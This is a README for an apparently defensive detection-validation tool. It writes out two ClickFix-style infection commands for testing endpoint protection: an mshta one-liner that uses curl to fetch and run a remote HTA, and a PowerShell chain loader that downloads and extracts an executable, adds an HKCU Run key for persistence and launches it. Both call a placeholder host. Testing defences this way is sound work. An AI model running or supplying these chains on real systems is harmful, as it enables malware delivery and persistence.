# clickfix_detecion_validator

These click-fix validations are a benign test of endpoint protection suites for detection of two infection methods observed in a production environment. 

## MSHTA

This method leverages a pasted command that downloads an HTA that then leverages cURL to download an extract a "PDF" that is actually a TAR archive containing the payload. The payload is then executed. If a file `C:\Users\<username>\Documents\928252966059280400\clickfix-sim-payload.txt` is created, the "infection" succeeded.

### Execution

cmd /v:on /c "set "u=%LOCALAPPDATA%\B.max" && curl -s -k -L -o "!u!" "https://<your_url.com>/B.max" && mshta "!u!" && del /f "!u!""

## PWSH

This method leveraged a PowerShell chain loader to install an application to the user's profile, then an HKCU registry entry to start the application on login. 

### Execution

"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -Command "$ErrorActionPreference='Stop';[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12;$stage=Join-Path $env:TEMP ([System.IO.Path]::GetRandomFileName());New-Item -ItemType Directory -Path $stage -Force|Out-Null;$tool=Join-Path $stage ([System.IO.Path]::GetRandomFileName()+'.exe');$zip=Join-Path $stage ([System.IO.Path]::GetRandomFileName()+'.zip');Invoke-WebRequest -Uri 'https://<your_url.com>/7z.exe' -OutFile $tool -UseBasicParsing;Invoke-WebRequest -Uri 'https://<your_url.com>/nexus_payload.zip' -OutFile $zip -UseBasicParsing;& $tool 'x' '-y' $zip|Out-Null;$extract=Join-Path $stage ([System.IO.Path]::GetRandomFileName());New-Item -ItemType Directory -Path $extract -Force|Out-Null;Expand-Archive -LiteralPath $zip -DestinationPath $extract -Force;$src=(Get-ChildItem -Path $extract -Filter NexusConnector.exe -Recurse -File|Select-Object -First 1).FullName;$dstDir=Join-Path $env:LOCALAPPDATA 'NexusConnector';New-Item -ItemType Directory -Path $dstDir -Force|Out-Null;$dst=Join-Path $dstDir 'NexusConnector.exe';Copy-Item -LiteralPath $src -Destination $dst -Force;$runKey='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run';New-ItemProperty -Path $runKey -Name 'NexusConnector' -Value ('\"'+$dst+'\"') -PropertyType String -Force|Out-Null;Start-Process -FilePath $dst;Remove-Item -LiteralPath $zip,$tool -Force -ErrorAction SilentlyContinue"
